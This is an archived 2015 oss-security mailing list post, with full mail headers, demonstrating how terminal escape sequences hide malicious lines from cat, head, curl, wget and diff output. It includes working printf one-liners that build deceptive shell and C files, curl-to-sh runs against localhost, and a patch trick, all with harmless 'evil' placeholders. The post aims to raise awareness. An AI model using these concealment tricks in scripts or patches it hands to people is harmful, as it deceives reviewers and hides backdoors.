X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4433" "Thursday" "17" "September" "2015" "18:03:19" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>" "155" "[oss-security] s/party/hack like it's 1999" nil nil nil "9" "2015091716:03:19" "[oss-security] s/party/hack like it's 1999" (number mark "        up201407890@ Sep 17  155/4433  " thread-indent "\"[oss-security] s/party/hack like it's 1999\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3541 invoked by uid 550); 17 Sep 2015 16:12:27 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16287 invoked from network); 17 Sep 2015 16:03:37 -0000
Message-ID: <20150917180319.1933609esmj3aaw4@webmail.alunos.dcc.fc.up.pt>
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Date: Thu, 17 Sep 2015 18:03:19 +0200
From: up201407890@alunos.dcc.fc.up.pt
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] s/party/hack like it's 1999
To: oss-security@lists.openwall.com

Federico Bento <up201407890@alunos.dcc.fc.up.pt>

So recently i've encountered a post by Kurt Seifried of RedHat on=20=20
oss-sec's mailing list entitled "Terminal escape sequences - the new=20=20
XSS for admins?"
http://www.openwall.com/lists/oss-security/2015/08/11/8

This is a little misleading title, since escape sequences have been=20=20
introduced circa 70's, so it's actually not that new.

How it technically works:
A terminal escape sequence is a special sequence of characters that is=20=20
printed (like any other text).
If the terminal understands the sequence, it won't display the=20=20
character-sequence, but will perform some action.

While some people might already know what i'm going to present you,=20=20
the majority I believe doesn't, so this is mostly to raise awareness.


$ printf '#!/bin/bash\necho doing something evil!\nexit\n\033[2Aecho=20=20
doing something very nice!\n' > backdoor.sh
$ chmod +x backdoor.sh
$ cat backdoor.sh
#!/bin/bash
echo doing something very nice!
$ ./backdoor.sh
doing something evil!


As you can see, our beloved 'cat' cheated on us. Why?
Because instead of displaying the character-sequence, the escape=20=20
sequence \033[XA (being X the number of times) performed some action.
And this action moves the cursor up X times, overwriting what is above=20=20
it X lines.
But this doesn't affect only 'cat', it affects everything that=20=20
interprets escape sequences.


$ head backdoor.sh
#!/bin/bash
echo doing something very nice!

$ tail backdoor.sh
#!/bin/bash
echo doing something very nice!

$ more backdoor.sh
#!/bin/bash
echo doing something very nice!


It's not over yet!


$ curl 127.0.0.1/backdoor.sh
#!/bin/bash
echo doing something very nice!

$ wget -qO - 127.0.0.1/backdoor.sh
#!/bin/bash
echo doing something very nice!


But if we pipe it into a shell...


$ curl -s 127.0.0.1/backdoor.sh|sh
doing something evil!

$ wget -qO - 127.0.0.1/backdoor.sh|sh
doing something evil!


You might be thinking "If I opened that in my browser, I would detect=20=20
it being malicious!"
Well, think again...
One can have all sorts of fun with user-agents, something that can=20=20
easily come to mind is verifying if the user-agent is from curl or wget,
and make them download the malicious file, if not,
redirect them to a legitimate file that looks like the original=20=20
output. Your browser would fool you then.

I wouldn't even be surprised if most of those install scripts that=20=20
make use of these 'pipe into sh' bullcrap abused this.
I wouldn't even be surprised if most of you were already pwned by=20=20
escape sequences in any situation at all.
Imagine the possibilities, from hidden ssh keys on your=20=20
authorized_keys to options hidden on your configuration files...
It's no secret, most of us rely on 'cat' to view files. I guess this=20=20
is one black kitty, giving you bad luck.


Here's another example with a .c file


$ printf '#include <stdio.h>\n\nint main()\n{\n\tprintf("doing=20=20
something evil\\n");\n\t/*\033[2A\n\t/* This simple program doesnt do=20=20
much... */\n\tprintf("doing something very nice\\n");\n\treturn=20=20
0;\n}\n' > nice.c
$ cat nice.c
#include <stdio.h>

int main()
{
	/* This simple program doesnt do much... */
	printf("doing something very nice\n");
	return 0;
}
$ gcc nice.c
$ ./a.out
doing something evil
doing something very nice


'diff' also interprets escape sequences and so do the resulting patches

going back to the first example, imagine I have a backdoored.sh that=20=20
is backdoored, and a legit.sh that does what it's output tells us.

$ cat backdoor.sh #evil file
#!/bin/bash
echo doing something very nice!

$ cat legit.sh #actually echoes doing something very nice!
#!/bin/bash
echo doing something very nice!


$ diff -Naur backdoor.sh legit.sh
--- backdoor.sh	2015-09-17 16:25:42.985349535 +0100
+++ legit.sh	2015-09-17 16:26:14.950158635 +0100
@@ -1,4 +1,2 @@
  #!/bin/bash
-echo doing something very nice!
+echo doing something very nice!


$ diff -Naur backdoor.sh legit.sh > file.patch
$ patch legit.sh -R file.patch
$ chmod +x legit.sh
$ ./legit.sh
doing something evil!


Hint:
'less' doesn't interpret escape sequences unless the -r switch is used,
so stop aliasing it to 'less -r' just because there's no colored output.


s/party/hack like it's 1999

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

